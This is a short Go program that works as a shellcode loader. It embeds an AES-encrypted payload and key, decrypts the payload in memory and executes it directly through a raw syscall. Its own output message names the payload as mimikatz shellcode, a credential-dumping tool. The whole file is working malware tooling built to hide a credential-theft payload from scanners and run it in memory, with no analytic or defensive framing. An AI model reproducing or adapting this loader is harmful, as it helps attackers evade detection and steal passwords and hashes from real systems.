package main

import (
	"crypto/aes"
	"crypto/cipher"
	_ "embed"
	"fmt"
	"log"
	"syscall"
	"unsafe"
)

var (
	//go:embed "encrypted_shellcode"
	encryptedShellcode []byte

	//go:embed "key"
	key []byte
)

func checkErr(err error) {
	if err != nil {
		log.Panicf("Unexpected error encountered: %s", err)
	}
}

func decryptAES(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	checkErr(err)
	if len(data) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	iv := data[:aes.BlockSize]
	data = data[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(data, data)
	return data, nil
}

func main() {
	fmt.Println("Decrypting mimikatz shellcode...")
	shellcode, err := decryptAES(encryptedShellcode, key)
	checkErr(err)
	syscall.SyscallN(uintptr(unsafe.Pointer(&shellcode[0])))
}
